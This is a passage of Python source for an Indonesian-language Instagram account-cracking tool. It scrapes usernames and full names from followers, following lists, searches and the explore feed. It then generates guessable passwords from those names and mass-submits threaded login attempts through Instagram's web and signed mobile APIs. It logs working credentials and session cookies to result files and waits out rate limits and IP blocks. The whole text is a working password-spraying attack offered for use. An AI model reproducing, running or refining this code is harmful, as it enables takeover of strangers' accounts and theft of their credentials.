		akun = ses.get(f"https://www.instagram.com/api/v1/users/web_profile_info/?username={user}",cookies=cok,headers={"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}).json()['data']['user'];
		id = akun['id'];nama = akun['full_name']
	except:print("COOKES NOT WORK ");time.sleep(2);back()
	return id,nama

###---[ GET DATA ]---###
def get_data(nama,id,z):
	urut = []
	console.print(Columns(urut))
	
###---[ MENU UTAMA ]---###
def main_menu(nama,uid,coki):
	clear_layar()
	logo()
	get_data(nama,uid,data)
	console = Console()
	table = Table(title=f"")
	table.add_column("nomor",width=7,justify="center",style="bold red")
	table.add_column("MENU",width=70,justify="center",style="bold white")
	table.add_column("status",width=7,justify="center",style="bold green")
	table.add_row(f"{ran_rich}1", "CRACK FOLLOWERS", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}2", "CRACK FOLLOWING", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}3", "CRACK NAME",f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}4", "CRACK TIMELINE", f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}5", "CRACK  CP",f"{H2}ON",style="bold")
	table.add_row(f"{ran_rich}0", f" CLEAR ({M2}COOKIE{P2})", f"{H2}ON",style="bold")
	console.print(table)
	apa = input(f" [{C}?{P}] pilih : ")
	if apa in ['1','01']:Pengikut(coki)
	elif apa in ['2','02']:Mengikuti(coki)
	elif apa in ['3','03']:Pencarian(coki)
	elif apa in ['4','04']:Timeline(coki)
	elif apa in ['5','05']:Crack_ulang()
	elif apa in ['6','0']:os.remove('.cookie_ig.txt');back()
	else: exit(f'[{M}!{P}] OK')
	
###---[ CEK HASIL ]---###
def cek_hasil():
	no,nom = 0,[]
	prints(Panel(f'\t\t\t   [bold][{ran_rich}01{P2}]. cek hasil akun ok\n\t\t\t   [{ran_rich}02{P2}]. cek hasil akun cp\n\t\t\t   [{ran_rich}03{P2}]. kembali ke menu',title=f'{M2}•{K2}•{H2}•{P2} RESULT {H2}•{K2}•{M2}•{P2}',padding=(0,5),style="bold white"))
	one = input(f' [{C}?{P}] pilih : ')
	if one in ['1','01']:
		try:ok = os.listdir('STAROZ')
		except:print(f" [{M}!{P}] tidak hasil");exit()
		for x in ok:
			if 'OK' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{H}{no}{P}] {x} - {H}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil ok");exit()
		for data in buka:
			try:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{H2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {H2}{user}")
				akun.add(f" [bold white]password   : {H2}{pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
			except:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				ps = data.split('|')[4].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{H2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {H2}{user}")
				akun.add(f" [bold white]password   : {H2}{pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
			prints(akun)
		exit()
	elif one in ['2','02']:
		try:ok = os.listdir('STAROZ')
		except:sys.exit(f"[{M}!{P}] tidak hasil")
		for x in ok:
			if 'CP' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil cp");exit()
		for data in buka:
			try:
				user = data.split('|')[0].replace(' ','')
				pw = data.split('|')[1].replace(' ','')
				pg = data.split('|')[2].replace(' ','')
				mg = data.split('|')[3].replace(' ','')
				akun = Tree(Panel.fit(f" [bold white]{K2}{file}{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {K2}{user}")
				akun.add(f" [bold white]password   : {K2}{pw}")
				akun.add(f" [bold white]followers  : {K2}{pg}")
				akun.add(f" [bold white]following  : {K2}{mg}")
				prints(akun)
			except:pass
		exit()
	else:print(f"[{M}!{P}] isi yang benar");time.sleep(2);back()
	
###---[ DUMP TIMELINE ]---###
class Timeline:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3","x-ig-app-id":'936619743392459'}
		self.cok = {'cookie':cookie}
		prints(Panel(f' [{ran_rich}!{P2}] mau dump sampai limit berapa id?, rekomendasi di bawah 2.500 id',padding=(0,9),style="bold white"))
		self.limit = int(input(f" [{C}?{P}] limit : "))
		self.dump()
		
	def dump(self):
		try:
			try:
				rozh = ses.get("https://www.instagram.com/api/v1/discover/web/explore_grid/?is_prefetch=false&omit_cover_media=false&module=explore_popular&use_sectional_payload=true&include_fixed_destinations=true",headers=self.hd, cookies=self.cok).json()
				for data in re.findall("'username': '(.*?)', 'full_name': '(.*?)'",str(rozh)):
					if "{" in str(data[0]) or "{" in str(data[1]):pass
					else:
						if data[0]+"|"+data[1] in dump:pass
						elif len(data[1])<4:pass
						else: dump.append(data[0]+"|"+data[1])
						print('\r [%s!%s] dump  : %s'%(C,P,len(dump)),end='')
						if len(dump)>=self.limit:
							print('\r [%s!%s] dump  : %s'%(C,P,len(dump)))
							exit(atur_sandi())
						sys.stdout.flush()
				self.dump()
			except:pass
		except KeyboardInterrupt:
			print('\r [%s!%s] dump  : %s'%(C,P,len(dump)));atur_sandi()
		except Exception as e:
			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
			else:print('\r [%s!%s] dump  : %s'%(C,P,len(dump)));atur_sandi()
		print('\r [%s!%s] dump  : %s'%(C,P,len(dump)))
		atur_sandi()
		
###---[ CRACK ULANG CP ]---###
class Crack_ulang:
	def __init__(self):
		global ok, cp
		prints(Panel(f'         [{ran_rich}!{P2}] silahkan pilih nomor yang akan di crack ulang',padding=(0,9),style="bold white"))
		nom, no = [], 0
		try:ook = os.listdir('STAROZ')
		except:sys.exit(f"[{M}!{P}] tidak hasil")
		for x in ook:
			if 'CP' in str(x):
				nom.append(x)
				no+=1
				try:jum= open('STAROZ/'+x,'r').readlines()
				except:continue
				print(f' [{K}{no}{P}] {x} - {K}{len(jum)} {P}akun')	
		abc = input(f' [{C}?{P}] nomor file : ')
		file = nom[int(abc)-1]
		try:buka = open('STAROZ/'+file,'r').readlines()
		except:print(f"[{M}!{P}] file tidak ada hasil cp");exit()
		tanggal = f"{hari}-{bulan}-{tahun}.txt"
		prints(Panel(f'\t\t   hasil ok di : {H2}STAROZ/OK-{tanggal}{P2}',padding=(0,5),style="bold white"))
		for data in buka:
			try:
				self.user = data.split('|')[0].replace(' ','')
				self.pw = data.split('|')[1].replace(' ','')
				self.login()
			except:pass
		prints(Panel(f'  [{ran_rich}!{P2}] crack telah selesai dengan jumlah ok : {H2}{ok}{P2} cp : {K2}{cp}{P2} terima kasih.',padding=(0,9),style="bold white"))
		exit()		
		
	def login(self):
		global ok, cp
		try:
			ses = requests.Session()
			timenow = str(time.time()).split(".")[0]
			csrf= ses.get("https://www.instagram.com/fxcal/auth/login/?app_id=1217981644879628&etoken=AbgiA1rDGBtpDlahtfIqLFMvbfpUkkcJsvCqWRQrnUVnkjgdqtTsruSdtWUDQmVIeTULaH-_PgOKISCM5FjL2-b79JSdphmpe7ygAa_X-4q-PInTf_20Eg9l&next=https%3A%2F%2Faccountscenter.instagram.com%2Fadd%2F%3Fauth_flow%3Dig_linking%26background_page%3D%252Fconnected_experiences%252Fcross_posting%252F",allow_redirects=True).cookies["csrftoken"]
			mid = None
			head = {'accept': '*/*','accept-encoding': 'gzip, deflate, br','accept-language': 'id,en-US;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded','cookie': f'ig_cb=1; csrftoken={csrf}; rur=FTW; mid={mid}','hosts': 'www.instagram.com','origin': 'https://www.instagram.com','referer': 'https://www.instagram.com/accounts/login/?source=auth_switcher','user-agent': ua_rozh(),'x-csrftoken': csrf,'sec-ch-ua': '"Google Chrome";v="89", "Chromium";v="89", ";Not A Brand";v="99"','sec-ch-ua-mobile': '?0','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','x-ig-app-id': '936619743392459','x-ig-www-claim': '0','x-instagram-ajax': '1007064846','x-requested-with': 'XMLHttpRequest'}
			date= {'username': self.user,'enc_password': f'#PWD_INSTAGRAM_BROWSER:0:{timenow}:{self.pw}','queryParams': '{"source":"auth_switcher"}','optIntoOneTap': 'false','next': 'https://www.instagram.com/accounts/access_tool/logins'}
			po = ses.post("https://www.instagram.com/accounts/login/ajax/", headers=head, data=date)
			if 'userId' in str(po.text):
				ok += 1
				try:dt = ses.get(f'https://www.instagram.com/api/v1/users/web_profile_info/?username={self.user}',headers={"user-agent": "Mozilla/5.0 (Linux; Android 8; Redmi 10A Build/GUG11R; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3579.460 Mobile Safari/537.36 Instagram 84.0.0.21.105 Android (24/7.0; 380dpi; 1080x1920; OnePlus; ONEPLUS A3010; OnePlus3T; qcom; en_US; 145652094)","x-ig-app-id":'936619743392459'}).json()["data"]["user"]
				except:dt=''
				try:na = dt["full_name"]
				except:na = '-'
				try:pg = dt["edge_followed_by"]["count"]
				except:pg = '0'
				try:mg = dt["edge_follow"]["count"]
				except:mg = '0'
				try:ps = dt["edge_owner_to_timeline_media"]["count"]
				except:ps = '0'
				akun = Tree(Panel.fit(f" [bold white]{H2}akun tidak checkpoint{P2}",style="bold white"))
				coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
				akun.add(f" [bold white]username   : {H2}{self.user}")
				akun.add(f" [bold white]password   : {H2}{self.pw}")
				akun.add(f" [bold white]followers  : {H2}{pg}")
				akun.add(f" [bold white]following  : {H2}{mg}")
				akun.add(f" [bold white]postingan  : {H2}{ps}")
				akun.add(f" [bold white]{H2}{coki}")
				prints(akun)
				open(sim_ok,'a').write('%s | %s | %s | %s \n'%(self.user,self.pw,pg,mg))
			elif 'checkpoint_url' in str(po.text):
				cp += 1
				akun = Tree(Panel.fit(f" [bold white]{K2}akun checkpoint{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {K2}{self.user}")
				akun.add(f" [bold white]password   : {K2}{self.pw}")
				prints(akun)
			elif 'Harap tunggu beberapa menit sebelum mencoba lagi.' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'Kesalahan' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'ip_block' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			elif 'Maaf, terdapat masalah pada permintaan Anda.' in str(po.text):
				input(f" [{C}!{P}] mode pesawat 5 detik lalu enter.")
				self.login()
			else:
				akun = Tree(Panel.fit(f" [bold white]{M2}akun salah sandi{P2}",style="bold white"))
				akun.add(f" [bold white]username   : {M2}{self.user}")
				akun.add(f" [bold white]password   : {M2}{self.pw}")
				prints(akun)
		except requests.exceptions.ConnectionError:
			input(f" [{C}!{P}] jika sudah ada jaringan silahkan enter.")
			self.login()
		except Exception as e:pass
								
###---[ DUMP PENGIKUT ]---###
class Pengikut:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
		self.cok = {'cookie':cookie}
		self.dump()
	
	def dump(self):
		prints(Panel(f'\t    [{ran_rich}!{P2}] INSTAGRAM USER CRACKED',padding=(0,9),style="bold white"))
		user = input(f' [{C}?{P}] user : ')
		if "https" in user or "instagram" in user:
			user = user.split("/")[3].split("?")[0]
		else:
			user = user
		self.id,na = get_id(user,self.cok)
		print(f' [{C}!{P}] NAME : {na}\n [{C}!{P}] USER : {self.id}')
		try:
			link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/followers/?count=100",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:dump.append(x['username']+'|'+x['full_name'])
			self.max = link['next_max_id']
			self.main_dump()
		except KeyboardInterrupt:
			print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		except Exception as e:
			if len(dump)<=100:print('gagal dump');time.sleep(2);back()
			else:print('\r [%s!%s] dump : %s'%(C,P,len(dump)));atur_sandi()
		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
		atur_sandi()
		
	def main_dump(self):
		try:
			link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/followers/?count=100&max_id={self.max}",headers=self.hd,cookies=self.cok).json()
			for x in link['users']:
				if len(x['full_name'])<=3:pass
				else:
					if x['username']+'|'+x['full_name'] in dump:pass
					else:dump.append(x['username']+'|'+x['full_name'])
					print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end='')
					sys.stdout.flush()
			self.max = link['next_max_id']
			self.main_dump()
		except Exception as e:pass
		
###---[ DUMP MENGIKUTI ]---###
class Mengikuti:
    def __init__(self, cookie):
        self.r = requests.Session()
        self.hd = {
            "user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3",
            "x-ig-app-id": '936619743392459'
        }
        self.cok = {'cookie': cookie}
        self.dump()

    def dump(self):
        prints(Panel(f'\t    [{ran_rich}!{P2}] INSTAGRAM USER CRACKED', padding=(0, 9), style="bold white"))
        limit = int(input("Total Accounts: "))
        jumlah = []  # Initialize the list outside the loop
        for x in range(0, limit):
            user = input(f' [{C}?{P}] user : ')
            jumlah.append(user)

        for user in jumlah:
            if "https" in user or "instagram" in user:
                user = user.split("/")[3].split("?")[0]
            else:
                user = user
            self.id, na = get_id(user, self.cok)
            print(f' [{C}!{P}] NAME : {na}\n [{C}!{P}] USER : {self.id}')
            try:
                link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100", headers=self.hd, cookies=self.cok).json()
                for x in link['users']:
                    if len(x['full_name']) <= 3:
                        pass
                    else:
                        dump.append(x['username'] + '|' + x['full_name'])
                self.max = link['next_max_id']
                self.main_dump()
            except KeyboardInterrupt:
                print('\r [%s!%s] dump : %s' % (C, P, len(dump)))
                atur_sandi()
            except Exception as e:
                if len(dump) <= 100:
                    print('gagal dump')
                    time.sleep(2)
                    back()
                else:
                    print('\r [%s!%s] dump : %s' % (C, P, len(dump)))
                    atur_sandi()
            print('\r [%s!%s] dump : %s' % (C, P, len(dump)))

        atur_sandi()

    def main_dump(self):
        try:
            link = self.r.get(f"https://b.i.instagram.com/api/v1/friendships/{self.id}/following/?count=100&max_id={self.max}", headers=self.hd, cookies=self.cok).json()
            for x in link['users']:
                if len(x['full_name']) <= 3:
                    pass
                else:
                    if x['username'] + '|' + x['full_name'] in dump:
                        pass
                    else:
                        dump.append(x['username'] + '|' + x['full_name'])
                        print('\r [%s!%s] dump : %s' % (C, P, len(dump)), end='')
                        sys.stdout.flush()
            self.max = link['next_max_id']
            self.main_dump()
        except Exception as e:
            pass


		
###---[ DUMP PENCARIAN ]---##$
class Pencarian:
	def __init__(self,cookie):
		self.r = requests.Session()
		self.ua = ua_rozh()
		self.cok = {'cookie':cookie}
		self.hd = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; id-ID; scale=3.00; 1170x2532; 382468104) NW/3" ,"x-ig-app-id":'936619743392459'}
		self.main()
		
	def main(self):
		prints(Panel(f'   [{ran_rich}!{P2}] silahkan masukan nama, gunakan "{K2},{P2}" ({K2}koma{P2}) untuk nama berikutnya',padding=(0,5),style="bold white"))
		list = input(f' [{C}?{P}] nama : ').split(",")
		for nama in list:
			try:
				for x in self.r.get('https://i.instagram.com/api/v1/web/search/topsearch/?context=blended&query=%s&rank_token=0.11856792192547738&include_reel=true'%(nama),cookies=self.cok,headers=self.hd).json()['users']:
					if len(x['user']['full_name'])<=3:pass
					else:
						if x['user']['username']+'|'+x['user']['full_name'] in dump:pass
						else:
							dump.append(x['user']['username']+'|'+x['user']['full_name'])
							print('\r [%s!%s] dump : %s'%(C,P,len(dump)),end="")
							time.sleep(0.04)
							sys.stdout.flush()
			except:pass
		if len(dump)<=0:exit('gagal dump')
		else:pass
		print('\r [%s!%s] dump : %s'%(C,P,len(dump)))
		atur_sandi()

###---[ BAGIAN SANDI ]---###
def atur_sandi():
    global prog, des
    tampung = []
    for x in dump:
        tampung.append(x)
    dump.clear()
    for x in tampung:
        xx = random.randint(0, len(dump))
        dump.insert(xx, x)
    prints(Panel(f'        [{ran_rich}?{P2}] API / REGULAR ({H2}A{P2}/{K2}R{P2})', title=f'{M2}•{K2}•{H2}•{P2} METODE {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
    metode = input(f" [{C}?{P}] METHOD : ")
    prints(Panel(f'\t\t     [bold][{ran_rich}01{P2}]. nama, 123, 12345\n\t\t     [{ran_rich}02{P2}]. nama, 123, 1234, 12345\n\t\t     [{ran_rich}03{P2}]. nama, 123, 1234, 12345, 123456\n\t\t     [{ran_rich}04{P2}]. custom password manual', title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 5), style="bold white"))
    apa = input(f" [{C}?{P}] PASSWORD : ")
    if apa in ["4", "04", "5", "05"]:
        prints(Panel(f" [{ran_rich}?{P2}] masukan sandi manual anda, contoh '{K2}bismillah{P2}' gunakan koma", title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
        manual = input(f" [{C}?{P}] sandi : ").split(",")
        prints(Panel(f"  [{ran_rich}?{P2}] masukan sandi belakang nama, contoh '{K2}1234{P2}' gunakan koma", title=f'{M2}•{K2}•{H2}•{P2} SANDI {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
        bk = input(f" [{C}?{P}] sandi : ").split(",")
    prints(Panel(f' [{ran_rich}?{P2}] INFORMATION ({K2}OK/NO{P2}) ({H2}O{P2}/{M2}N{P2})', title=f'{M2}•{K2}•{H2}•{P2} INFO {H2}•{K2}•{M2}•{P2}', padding=(0, 10), style="bold white"))
    bbz = input(f' [{C}?{P}] pilih  : ')
    if bbz in ['o', '1', '01', 'yy', 'O', 'oO']:
        pilih_info.append("yes")
    else:
        pilih_info.append("no")
    tanggal = f"{hari}-{bulan}-{tahun}.txt"
    prints(Panel(f'\t\t   OK IN : {H2}STAROZ/OK-{tanggal}{P2}\n\t\t   CP IN : {K2}STAROZ/CP-{tanggal}{P2}', padding=(0, 5), style="bold white"))
    prog = Progress(SpinnerColumn('clock'), TextColumn('{task.description}'), BarColumn(), TextColumn('{task.percentage:.0f}%'), TimeElapsedColumn())
    des = prog.add_task('', total=len(dump))
    with prog:
        with ThreadPoolExecutor(max_workers=30) as babas:
            for akun in dump:
                user, nama = akun.split('|')[0], akun.split('|')[1].lower()
                dp = nama.split(' ')[0]
                dp2 = nama.split(' ')[1] if len(nama.split(' ')) > 1 else None
                fn = nama.replace(' ', '')
                res1 = " ".join(re.split("[^a-zA-Z]*", user)).replace(" ","")
                user2 = res1.lower()
                if apa in ['1', '01']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123']
                    else:
                        pwx = [nama, nama.replace(' ', ''), dp + '123', user +
                               
                               "123"]
                elif apa in ['2', '02']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '12345']
                    else:
                        pwx = [nama, nama.replace(' ', ''), dp + '12345']
                elif apa in ['3', '03']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
                    elif dp2 != None:
                        pwx = [nama, dp2 + "123", dp2 + "1234", dp2 + "12345", dp2 + '1', dp2 + '12']
                    else:
                         pwx = [nama, fn + '123', fn + '1', fn + '12', fn + '1122', fn + '1234', fn + '12345', dp + '1', dp + '12', dp + '123', dp + '1234', dp + '12345', dp + '1122', user2, user2 + '123', user2 + '1234', user2 + '12345']   
                elif apa in ['4', '04']:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = manual
                    else:
                        kombo = []
                        pwx = [nama.replace(' ', ''), nama] + manual
                        for x in bk:
                            kombo.append(str(dp) + str(x))
                        pwx = pwx + kombo
                else:
                    if len(dp) < 3 or len(nama) < 5:
                        pwx = [nama.replace(' ', '') + '123', nama.replace(' ', '') + '12345']
                    else:
                        pwx = [nama.replace(' ', ''), dp + '123', dp + '1234', dp + '12345']
                if metode in ["r", "R", "regular", "Regular"]:
                    babas.submit(Mengheker, user, pwx)
                else:
                    babas.submit(MetodApi, user, pwx)
    prints(Panel(f'  [{ran_rich}!{P2}] CRACK INSTAGRAM OK : {H2}{ok}{P2} CP : {K2}{cp}{P2} THANKS.', padding=(0, 9), style="bold white"))
    exit()


###---[ METHODE API ]---###	
def MetodApi(user,pewe):
	global ok, cp, loop
	sesion = 0
	if sesion > 0: sesion = 0
	ses = requests.Session()
	prog.update(des,description=f"{P2}[{H2}aman{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
	prog.advance(des)
	rr = random.randint
	ua_fake = f"Instagram {str(rr(100,250))}.1.0.16.113 Android (33/{rr(5,9)}; 420dpi; 1080x2156; BLD/Blade; BLD{str(rr(1111,5555))}; Ahmed; Alzwage; en_GB; 387809238)"
	while True:
		try:
			ua = ua_rozha()
			base = json.dumps({'id': str(uuid.uuid4()), 'experiments': 'ig_android_account_switching,ig_android_upsell_fullname,ig_android_one_click_in_old_flow,ig_android_landing_page_fb_button,ig_fbns_push,ig_android_split_username_reg,ig_android_separate_avatar_upload,ig_android_contact_point_triage,ig_fbns_blocked,ig_android_re_enable_login_button,ig_android_phone_tab_on_left'})
			kode = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(base).encode('utf=8'),hashlib.sha256).hexdigest()
			data = {"signed_body": f"{kode}.{str(base)}"}
			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(data))}', 'x-ig-connection-type': 'WIFI', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'ar-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			one = ses.post("https://i.instagram.com/api/v1/qe/sync/",headers=head,data=data).json()
			if "ok" in one["status"]:break
			else: continue
		except:pass
	for pw in pewe:
		try:
			csrf = ses.cookies["csrftoken"]
			data = {"phone_id": str(uuid.uuid4()),"_csrftoken": csrf,"username": user,"guid": str(uuid.uuid4()),"device_id": "android-%s" % hashlib.md5(str(time.time()).encode()).hexdigest()[:16],"password": pw,"login_attempt_count": str(sesion)}
			ned = hmac.new("46024e8f31e295869a0e861eaed42cb1dd8454b55232d85f6c6764365079374b".encode('utf-8'), str(data).encode('utf=8'),hashlib.sha256).hexdigest()			
			date = f"signed_body={ned}.%7B%22phone_id%22%3A%22{str(uuid.uuid4())}%22%2C%22_csrftoken%22%3A%22{csrf}%22%2C%22username%22%3A%22{user}%22%2C%22guid%22%3A%22{str(uuid.uuid4())}%22%2C%22device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22password%22%3A%22{pw}%22%2C%22login_attempt_count%22%3A%22{sesion}%22%7D&ig_sig_key_version=4"
			head = {'Host': 'i.instagram.com', 'content-length': f'{len(str(date))}', 'x-ig-connection-type': 'LTE', 'x-ig-capabilities': '3brTvx0=', 'accept-language': 'ar-LY', 'content-type': 'application/x-www-form-urlencoded; charset=UTF-8', 'user-agent': ua, 'accept-encoding': 'gzip, deflate'}
			bz = ses.post(f"https://i.instagram.com/api/v1/accounts/login/",headers=head,data=date)
		 #prints(bz.text,"\n\r")
			sesion += 1
			if "logged_in_user" in bz.text:
				user = bz.json()["logged_in_user"]["username"]
				na, pg, mg, ps = cek_info(user)
				open(".ua_instagram.txt","a").write(str(ua)+"\n")
				if "no" in pilih_info:
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]FOLLOWERS  : {H2}{pg}")
					akun.add(f" [bold white]UA  : {K2}{ua}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps))
				else:
					coki = ";".join([key+"="+value.replace('"','') for key, value in ses.cookies.get_dict().items()])
					em, nop, ttl, thn = cek_data2(coki)
					akun = Tree(Panel.fit(f" [bold white]{H2}{user}{P2} | {H2}{pw}",style="bold white"))
					akun.add(f" [bold white]FOLLOWERS  : {H2}{pg}")
					akun.add(f" [bold white]FOLLOWING  : {H2}{mg}")
					akun.add(f" [bold white]UA  : {K2}{ua}")
					prints(akun)
					print()
					open(sim_ok,'a').write('%s | %s | %s | %s | %s | %s | %s | %s | %s\n'%(user,pw,pg,mg,ps,nop,ttl))
				ok+=1
				#try:cek_email(ses.cookies.get_dict()["sessionid"])
				#except:pass				
				break
			elif "challenge_required" in bz.text:
				na, pg, mg, ps = cek_info(user)
				akun = Tree(Panel.fit(f" [bold white]{K2}{user}{P2} | {K2}{pw}",style="bold white"))
				akun.add(f" [bold white]FOLLOWERS  : {K2}{pg}")
				akun.add(f" [bold white]FOLLOWING  : {K2}{mg}")
				akun.add(f" [bold white]POST  : {K2}{ps}")
				akun.add(f" [bold white]UA  : {K2}{ua}")
				prints(akun)
				print()
				cp+=1
				open(sim_cp,'a').write('%s | %s | %s | %s \n'%(user,pw,pg,mg))
				break
			elif "Error" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v3{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Kesalahan" in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v2{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			elif "Harap tunggu beberASUapa menit sebelum mencoba lagi." in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v1{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(10)
			elif 'ip_block' in bz.text:
				prog.update(des,description=f"{P2}[{M2}spam v4{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
				prog.advance(des)
				sleep(15)
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(15)
		#except Exception as e:print(e)
	loop+=1

###---[ HMAC GENERATOR ]---###
def get_hmac():
	rc = random.choices
	A = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=17)); B = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=10)); C = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=10)); D = "".join(rc("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890", k=7))
	return f"hmac.{A}-{B}-{C}-{D}-"

###---[ METODE REGULAR ]---###
def Mengheker(user,pewe):
	global ok, cp, loop
	sesion = 0
	if sesion > 0: sesion = 0
	ses = requests.Session()
	prog.update(des,description=f"{P2}[{H2}aman{P2}] {loop}/{len(dump)} OK : [bold]{H2}{ok}{P2} CP : {K2}{cp}{P2}")
	prog.advance(des)
	rr = random.randint
	ua_fake = f"Instagram {str(rr(100,250))}.1.0.16.113 Android (33/{rr(5,9)}; 420dpi; 1080x2156; BLD/Blade; BLD{str(rr(1111,5555))}; Ahmed; Alzwage; en_GB; 387809238)"
	while True:
		try:
			ua = ua_rozh() 
